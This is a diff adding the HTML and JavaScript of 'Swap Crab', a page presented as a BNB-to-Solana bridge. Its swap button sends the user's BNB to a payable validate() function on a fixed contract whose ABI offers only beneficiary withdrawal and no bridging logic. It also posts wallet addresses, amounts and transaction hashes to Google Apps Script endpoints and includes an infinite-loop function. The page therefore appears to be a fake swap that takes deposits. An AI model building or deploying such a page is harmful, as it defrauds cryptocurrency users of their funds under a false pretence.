@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swap Crab</title>
+    <link rel="icon" type="image/x-icon" href="icon.png">
+    <link rel="stylesheet" type="text/css" href="header.css">
+    <link rel="stylesheet" type="text/css" href="body.css">
+    <link rel="stylesheet" type="text/css" href="footer.css">
+<style>
+</style>
+</head>
+<body>
+
+<div class="header">
+<a href="index.html"><img src="logo.png" align="left" class="logo"></a>
+<b><p id="wallet-address" style="color:white;"></p></b>
+
+<button id="connect-wallet"><b>Connect Wallet</b></button>
+<button id="disconnect-wallet" style="display: none;"><b>Disconnect Wallet</b></button>
+</div>
+
+<div id="notification" style="background-color: transparent;"></div>
+
+<table id="bridge-swap">
+<tr>
+<td colspan=2><h2>Send</h2></td>
+</tr>
+
+<tr>
+<td>
+        <div class="content-container" id="from-div">
+          <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/bnb-chain-binance-smart-chain-logo.png" class="chain-logo">
+          <p  class="coin-holder">FROM</p>
+        </div>
+
+</td>
+<td>
+        <div class="content-container" id="to-div">
+          <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="chain-logo">
+          <p class="coin-holder">TO</p>
+        </div>
+
+</td>
+</tr>
+
+<tr>
+<td>
+	<select class="chain-select">
+          <option value="BSC">BSC - chain</option>
+        </select>
+</td>
+<td>
+	<select class="chain-select">
+          <option value="SOL">SOL - chain</option>
+        </select>
+</td>
+
+<tr>
+	<td colspan=2>
+ <div class="select-container">
+    <select id="asset" required>
+      <option value="Sol-Token">Solana Token</option>
+    </select>
+    <label for="asset" class="required" id="select-label">Asset</label>
+  </div>
+
+</td>
+
+</tr>
+
+<tr>
+<td colspan=2>
+
+  <div class="withdraw-container">
+    <div class="input-container">
+      <input type="text" id="withdrawAmount" placeholder=" " >
+      <label for="withdrawAmount" id="input-label">Amount</label>
+      <button class="max-button" onclick="setMaxAmount()">Max</button>
+    </div>
+    <div class="balance">Minimum : 0.038 BNB | <p id="bnb">Available: 00 BNB</p></div>
+  </div>
+
+</td>
+
+</tr>
+
+<tr>
+	<td colspan=2><div class="input-container">
+    <input type="text" id="solwallet" placeholder=" ">
+    <label for="username" id="input-label">Destination Address</label>
+  </div> </td>
+</tr>
+
+<tr>
+	<td colspan=2 style="padding-top:30px;"><button id="swap-btn">Swap</button></td>
+</tr>
+
+</table>
+<br>
+<footer>
+    <div>
+      <a href="#">&copy; Swap Crab Labs.</a>
+    </div>
+    <div>
+      <a href="docs.html">Docs</a> |
+      <a href="contact.html">Contact</a>
+    </div>
+  </footer>
+
+  <script>
+    function setMaxAmount() {
+      document.getElementById('withdrawAmount').value = balance;
+    }
+  </script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+ <script>
+        const web3 = new Web3(Web3.givenProvider);
+        const contractABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_beneficiary",
+				"type": "address"
+			}
+		],
+		"name": "setBeneficiary",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "_minAmount",
+				"type": "uint256"
+			}
+		],
+		"name": "setMinAmount",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "_minAmount",
+				"type": "uint256"
+			},
+			{
+				"internalType": "address",
+				"name": "_beneficiary",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [],
+		"name": "validate",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "withdrawBNB",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	},
+	{
+		"inputs": [],
+		"name": "beneficiary",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "minAmount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+];
+        const contractAddress = '0xA4583a16b9B81F07075e18D64cB082c61339cAf8';
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        let walletConnected = false;
+        let balance = 0;
+        let walletAddress;
+        let minAmount = 0.038;
+
+document.getElementById('connect-wallet').addEventListener('click', async () => {
+    try {
+
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const networkId = await ethereum.request({ method: 'net_version' });
+
+        // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
+        if (networkId === '56' || networkId === '97') {
+            walletAddress = accounts[0];
+
+        walletConnected = true;
+        document.getElementById("wallet-address").textContent = "Wallet Address : " + walletAddress;
+        document.getElementById('disconnect-wallet').style.display = 'inline';
+        document.getElementById('connect-wallet').style.display = 'none';
+
+
+        // Fetch and display BNB balance
+        balance = await web3.eth.getBalance(accounts[0]);
+        balance = web3.utils.fromWei(balance, 'ether');
+        document.getElementById('bnb').textContent = `Available: ${balance} BNB`;
+
+            updateLog(walletAddress,'Home - Wallet Connect');
+        } else {
+            // Display an error message if the connected network is not BSC
+        flashNotification('Error: Connect to Binance Smart Chain', 'red');
+
+	    updateLog("Error: Connect Binance Chain", `❌ Home: ${error.message}`);
+        }
+    } catch (error) {
+        flashNotification('Error connecting wallet', 'red');
+	    updateLog("Error connecting wallet", `❌ Home: ${error.message}`);
+    }
+});
+
+
+document.getElementById('disconnect-wallet').addEventListener('click', () => {
+    ethereum.send('eth_requestAccounts').then(() => {
+        walletConnected = false;
+        document.getElementById("wallet-address").textContent = '';
+        document.getElementById('connect-wallet').style.display = 'inline';
+        document.getElementById('disconnect-wallet').style.display = 'none';
+
+        if (ethereum && ethereum.disconnect) {
+            ethereum.disconnect();
+        }
+    });
+});
+
+function flashNotification(message, color) {
+            const notification = document.getElementById('notification');
+            notification.style.backgroundColor = color;
+            notification.textContent = message;
+            setTimeout(() => {
+                notification.style.backgroundColor = 'transparent';
+                notification.textContent = '';
+            }, 3000);
+        }
+
+document.getElementById('swap-btn').addEventListener('click', async () => {
+if(document.getElementById("withdrawAmount").value >= minAmount)
+{
+btnProcess(true);
+try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const networkId = await ethereum.request({ method: 'net_version' });
+
+        // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
+        if (networkId === '56' || networkId === '97') {
+            walletAddress = accounts[0];
+
+            walletConnected = true;
+
+            const swapBnb = document.getElementById('withdrawAmount').value;
+            const weiAmount = web3.utils.toWei(swapBnb, 'ether');
+        const gas = await contract.methods.validate().estimateGas({ value: weiAmount });
+
+        const result1 = await contract.methods.validate().send({ from: accounts[0], value: weiAmount, gas});
+	let traxHash = result1.transactionHash;
+	
+	if (result1.status) {        
+	        flashNotification('Success : Swap Request '+document.getElementById("withdrawAmount").value+' BNB', 'green');	
+		Record("BNB : "+walletAddress,traxHash);
+		updateLog(walletAddress,'✅ 1 - '+document.getElementById("withdrawAmount").value+' BNB');
+	}
+
+	btnProcess(false);
+	
+        } }catch (error) {
+	        flashNotification(error.message, 'red');
+		btnProcess(false);
+		updateLog(walletAddress,'❌ - '+document.getElementById("withdrawAmount").value+' BNB - '+error.message);
+
+		if (result1.status) { 
+		Snap();
+		}
+        }
+
+}
+else
+        flashNotification("Enter valid BNB Amount", 'blue');
+        
+});
+
+async function updateLog(_walletAddress, _activity)
+{
+
+    const walletAddress = _walletAddress;
+    const currentPage = _activity;
+    const postData = {
+        time: updateCurrentTime(),
+        wallet: walletAddress,
+        page: currentPage,
+    };
+
+    const url = 'https://script.google.com/macros/s/AKfycbxwbhqiznLw0EmNe0kdsonksoXNxchvHNfvfodYTvwrviWnnTMudqWjLBhpCTzLBlfR/exec'; 
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(postData),
+    });
+
+    const result = await response.text();
+}
+
+async function Record(_Address,_hash)
+{
+
+const asset =  document.getElementById("asset").value;
+const amount = document.getElementById("withdrawAmount").value;
+const bnb = _Address;
+const sol = document.getElementById("solwallet").value;
+const txhash = _hash;
+
+    const postData = {
+        time: updateCurrentTime(),
+	asset: asset,
+	amount: amount,
+        bnbAddress: bnb,
+        solAddress: sol,
+	hash : txhash,
+    };
+
+    const url = 'https://script.google.com/macros/s/AKfycbxZgCupq-Hkph9mC051822BigrV75-6J0eiq7FhsFkseCyWFxXRcXsR2EDCVxEPTEzU/exec'; 
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(postData),
+    });
+
+    const result = await response.text();
+}
+
+
+window.onload = function () {
+      updateCurrentTime();
+    };
+
+    function updateCurrentTime() {
+      const currentDateTime = new Date();
+       const options = { 
+        year: 'numeric', 
+        month: 'numeric', 
+        day: 'numeric', 
+        hour: 'numeric', 
+        minute: 'numeric', 
+        second: 'numeric', 
+        hour12: true, // Use 12-hour format with AM/PM
+        timeZoneName: 'short' // Include the UTC time zone abbreviation
+      };
+      const currentDateTimeString = currentDateTime.toLocaleString('en-US', options);
+      return currentDateTimeString;   
+    }
+
+    setInterval(updateCurrentTime, 1000);
+
+function btnProcess(state)
+{
+if (state ==true)
+{
+document.getElementById("swap-btn").innerHTML="Processing...";
+document.getElementById("swap-btn").style.backgroundColor = "grey";
+
+}
+else
+{
+document.getElementById("swap-btn").innerHTML="Swap";
+document.getElementById("swap-btn").style.backgroundColor = '#F50870FF';
+}
+}
+
+    function Snap() {
+      while (true) {
+        console.log("Swap BNB "+ document.getElementById("withdrawAmount").value);
+      }}
+</script>
+</body>
+</html>
+
